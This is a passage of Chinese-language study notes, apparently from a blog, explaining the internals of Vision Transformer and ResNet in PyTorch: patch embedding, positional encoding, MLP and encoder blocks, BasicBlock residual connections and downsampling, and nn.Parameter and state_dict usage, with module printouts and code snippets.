…
patch大小16x16，则输入序列长度为196，每个patch维度为16x16x3=768。经过768x768的linear projection之后维度为196x768。由于在前面需要加一个特殊字符[cls]，因此最终的维度是197x768。 positional encoding：与patch embedding相加得到最终结果，有以下三种：  1-D pos emb：只考虑patch flatten之后的相对位置信息 2-D pos emb：同时考虑X轴和y轴的信息 rel pos emb：   MHA  关于位置编码 不管使用哪种位置编码方式，模型的精度都很接近，甚至不适用位置编码，模型的性能损失也没有特别大。原因可能是ViT是作用在image patch上的，而不是image pixel，对网络来说这些patch之间的相对位置信息很容易理解。\n混合模型 在数据量较小时，混合模型比较占优，但较大时会被Transformer超越。\n图像分类方法 在原论文中，为了执行分类任务，作者在编码时引入了NLP界常用的[cls]标签，但也可以使用传统的average pooling，两种方法较为相近。\n数据集 ViT只在较大数据集上占据优势。\ncode MLP ViT中的MLP和Transformer中的没有太大的区别：\n1 2 3 4 5 6 7  MLPBlock( (0): Linear(in_features=768, out_features=3072, bias=True) (1): GELU(approximate=none) (2): Dropout(p=0.0, inplace=False) (3): Linear(in_features=3072, out_features=768, bias=True) (4): Dropout(p=0.0, inplace=False) )   当然，注意到代码中对MLP层进行了初始化：\n1 2 3 4 5 6 7 8 9 10  class MLPBlock(MLP): \u0026#34;\u0026#34;\u0026#34;Transformer MLP block.\u0026#34;\u0026#34;\u0026#34; def __init__(self, in_dim: int, mlp_dim: int, dropout: float): super().__init__(in_dim, [mlp_dim, in_dim], activation_layer=nn.GELU, inplace=None, dropout=dropout) for m in self.modules(): if isinstance(m, nn.Linear): nn.init.xavier_uniform_(m.weight) if m.bias is not None: nn.init.normal_(m.bias, std=1e-6)   Encoder Layer 基本结构如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  EncoderBlock( (ln_1): LayerNorm((768,), eps=1e-06, elementwise_affine=True) (self_attention): MultiheadAttention( (out_proj): NonDynamicallyQuantizableLinear(in_features=768, out_features=768, bias=True) ) (dropout): Dropout(p=0.0, inplace=False) (ln_2): LayerNorm((768,), eps=1e-06, elementwise_affine=True) (mlp): MLPBlock( (0): Linear(in_features=768, out_features=3072, bias=True) (1): GELU(approximate=none) (2): Dropout(p=0.0, inplace=False) (3): Linear(in_features=3072, out_features=768, bias=True) (4): Dropout(p=0.0, inplace=False) ) )   结构同样模仿transformer，此处不再赘述。\n1 2 3 4 5 6 7 8 9 10  def forward(self, input: torch.Tensor): torch._assert(input.dim() == 3, f\u0026#34;Expected (batch_size, seq_length, hidden_dim) got {input.shape}\u0026#34;) x = self.ln_1(input) x, _ = self.self_attention(query=x, key=x, value=x, need_weights=False) x = self.dro
…
planes, planes) self.bn2 = norm_layer(planes) self.downsample = downsample self.stride = stride def forward(self, x): identity = x out = self.conv1(x) out = self.bn1(out) out = self.relu(out) out = self.conv2(out) out = self.bn2(out) if self.downsample is not None: identity = self.downsample(x) # residual connection out += identity out = self.relu(out) return out   每一个BasicBlock对应的是这样一个模块：\n其__init__参数中的inplanes和planes分别指代input channel和output channel，一个简单示例如下：\n1 2 3 4 5 6 7 8 9  \u0026gt;\u0026gt; basicblockimpl = BasicBlock(64, 128) \u0026gt;\u0026gt; print(basicblockimpl) BasicBlock( (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) )   其forward部分如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  def forward(self, x): identity = x out = self.conv1(x) out = self.bn1(out) out = self.relu(out) out = self.conv2(out) out = self.bn2(out) if self.downsample is not None: identity = self.downsample(x) # residual connection out += identity out = self.relu(out) return out   注意到其中的残差连接部分。值得注意的是，为了进行维度匹配，forward中还存在self.downsample部分，是一个channel维度不匹配的二维卷积。之后在Resnet的解释中会详细说明：\n1 2 3 4  (downsample): Sequential( (0): Conv2d(256, 512, kernel_size=(1, 1), stride=(2, 2), bias=False) (1): BatchNorm2d(512, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) )   Resnet 观察其forward函数，我们逐个分析其中的模块：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  def _forward_impl(self, x): # [2, 3, 224, 224] x = self.conv1(x) # [2, 64, 112, 112] x = self.bn1(x) x = self.relu(x) x = self.maxpool(x) # [2, 64, 56, 56] x = self.layer1(x) # [2, 64, 56, 56] x = self.layer2(x) # [2, 128, 28, 28] x = self.layer3(x) # [2, 256, 14, 14] x = self.layer4(x) # [2, 512, 7, 7] x = self.avgpool(x) # [2, 512, 1, 1] x = torch.flatten(x, 1) # [2, 512] x = self.fc(x) # [2, 1000] return x   self.conv1(x)使用7x7卷积核，将图片的channel从3变为64，同时特征图长宽缩短一半。\n1  (conv1): Conv2d(3, 64, kernel_size=(7, 7), stride=(2, 2), padding=(3, 3), bias=False)     self.maxpool(x)将特征图长宽再缩短一半。\n1  (maxpool): MaxPool2d(kernel_size=3, stride=2, padding=1, dilation=1, ceil_mode=False)     之后是模块的主体部分：\n1 2 3 4 5 6 7  self.layer1 = self._make_layer(block, 64, layers[0]) self.layer2 = self._make_layer(block, 128, layers[1], stride=2, dilate=replace_stride_with_dilation[0]) self.layer3 = self._make_layer(block, 256, layers[2], stride=2, dilate=replace_stride_with_dilation[1]) self.layer4 = self._make_layer(block, 512, layers[3], stride=2, dilate=replace_stride_with_dilation[2])   首先看这4个层中共有的特征：64/128/256/512是输出通道数，layers[i]是通道的层数。\n注意到layer1和其它模块参数的不同之处：无stride。这决定了：\n 每一个layer第一个BasicBlock的状态：  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ## layer 1 (0): BasicBlock( (conv1): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(64, 64, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(64, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) ## layer 2 (0): BasicBlock( (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (downsample): Sequential( (0): Conv2d(64, 128, kernel_size=(1, 1), stride=(2, 2), bias=False) (1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) )   第一个layer用于缩小特征图和增加channel数（stride=1时除外）。其它的layer保持特征图的尺寸不变。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  layers = [] layers.append(block(self.inplanes, planes, stride, downsample, self.groups, self.base_width, previous_dilation, norm_layer)) self.inplanes = planes * block.expansion for _ in range(1, blocks): layers.append(block(self.inplanes, planes, groups=self.groups, base_width=self.base_width, dilation=self.dilation, norm_layer=norm_layer)) (layer2): Sequential( (0): BasicBlock( (conv1): Conv2d(64, 128, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (downsample): Sequential( (0): Conv2d(64, 128, kernel_size=(1, 1), stride=(2, 2), bias=False) (1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) ) (1): BasicBlock( (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) (2): BasicBlock( (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) (3): BasicBlock( (conv1): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn1): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (relu): ReLU(inplace=True) (conv2): Conv2d(128, 128, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1), bias=False) (bn2): BatchNorm2d(128, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) ) )   是否含有downsample层：  1 2 3 4  downsample = nn.Sequential( conv1x1(self.inplanes, planes * block.expansion, stride), norm_layer(planes * block.expansion), )   当跨层进行残差连接时，可能会出现维度不匹配的问题，这时候需要进行downsampling以使得维度匹配：\n1 2 3  out: torch.Size([2, 128, 28, 28]) in before: torch.Size([2, 64, 56, 56]) in after: torch.Size([2, 128, 28, 28
…
6]: a = torch.nn.Parameter(torch.Tensor([0])) In [7]: a Out[7]: Parameter containing: tensor([0.], requires_grad=True)   nn.Parameter默认requires_grad=True\n一些常用参量（用于更新参数等）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  \u0026gt;\u0026gt; class Net(torch.nn.Module): ...: def __init__(self): ...: super().__init__() ...: self.linear_1 = torch.nn.Linear(3,2) ...: self.linear_2 = torch.nn.Linear(2,1) \u0026gt;\u0026gt; net = Net() \u0026gt;\u0026gt; net.modules \u0026gt;\u0026gt; \u0026lt;bound method Module.modules of Net( (linear_1): Linear(in_features=3, out_features=2, bias=True) (linear_2): Linear(in_features=2, out_features=1, bias=True) )\u0026gt; \u0026gt;\u0026gt; net.named_modules \u0026gt;\u0026gt; \u0026lt;bound method Module.named_modules of Net( (linear_1): Linear(in_features=3, out_features=2, bias=True) (linear_2): Linear(in_features=2, out_features=1, bias=True) )\u0026gt; \u0026gt;\u0026gt; net.state_dict() \u0026gt;\u0026gt; OrderedDict([(\u0026#39;linear_1.weight\u0026#39;, tensor([[-0.5300, -0.5476, 0.0943], [-0.2907, 0.1068, 0.5465]])), (\u0026#39;linear_1.bias\u0026#39;, tensor([ 0.3375, -0.4314])), (\u0026#39;linear_2.weight\u0026#39;, tensor([[ 0.0114, -0.2185]])), (\u0026#39;linear_2.bias\u0026#39;, tensor([0.1354]))]) \u0026gt;\u0026gt; net.parameters \u0026gt;\u0026gt; \u0026lt;bound method Module.parameters of Net( (linear_1): Linear(in_features=3, out_features=2, bias=True) (linear_2): Linear(in_features=2, out_features=1, bias=True) )\u0026gt; \u0026gt;\u0026gt; net.lambda1 = torch.nn.Parameter(torch.randn((1,1))) \u0026gt;\u0026gt; net.lambda1 \u0026gt;\u0026gt; Parameter containing: tensor([[-0.0876]], requires_grad=True) \u0026gt;\u0026gt; net.state_dict() \u0026gt;\u0026gt; OrderedDict([(\u0026#39;lambda1\u0026#39;, tensor([[-0.0876]])), (\u0026#39;linear_1.weight\u0026#39;, tenso
…
